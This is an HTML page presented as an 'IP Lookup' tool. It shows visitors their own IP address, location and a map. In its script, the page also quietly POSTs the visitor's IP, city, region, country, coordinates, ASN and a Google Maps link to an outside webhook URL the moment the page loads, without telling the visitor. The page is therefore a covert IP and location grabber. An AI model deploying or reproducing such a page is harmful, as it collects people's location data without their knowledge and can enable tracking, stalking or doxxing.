<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Tracker</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 40px;
    }

    h1 {
      font-size: 32px;
      margin-bottom: 10px;
    }

    #info-box {
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 12px;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
    }

    #map {
      margin-top: 25px;
      width: 100%;
      max-width: 600px;
      border-radius: 8px;
      border: 1px solid #444;
    }

    .label {
      color: #999;
      font-weight: 500;
    }
  </style>
</head>
<body>

  <h1>IP Lookup</h1>
  <div id="info-box">
    <div id="ip-info">Loading...</div>
  </div>
  <img id="map" src="" alt="Map" />

  <script>
    async function fetchAndSendIP() {
      try {
        const res = await fetch("https://api.db-ip.com/v2/free/self");
        const data = await res.json();

        const {
          ipAddress,
          city,
          stateProv,
          countryName,
          latitude,
          longitude,
          asn
        } = data;

        const mapURL = `https://staticmap.openstreetmap.de/staticmap.php?center=${latitude},${longitude}&zoom=10&size=600x300&markers=${latitude},${longitude},lightblue1`;

        document.getElementById("ip-info").innerHTML = `
          <p><span class="label">IP:</span> ${ipAddress}</p>
          <p><span class="label">City:</span> ${city}</p>
          <p><span class="label">Region:</span> ${stateProv}</p>
          <p><span class="label">Country:</span> ${countryName}</p>
          <p><span class="label">ASN:</span> ${asn}</p>
        `;
        document.getElementById("map").src = mapURL;

        await fetch("https://webhook-test.com/26eff05a1fb9bd13e113d9a93d51f174", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: ipAddress,
            city,
            region: stateProv,
            country: countryName,
            latitude,
            longitude,
            asn,
            map: `https://maps.google.com/?q=${latitude},${longitude}`
          })
        });
      } catch (err) {
        console.error("Error fetching IP:", err);
        document.getElementById("ip-info").innerText = "Could not retrieve IP information.";
      }
    }

    fetchAndSendIP();
  </script>

</body>
</html>
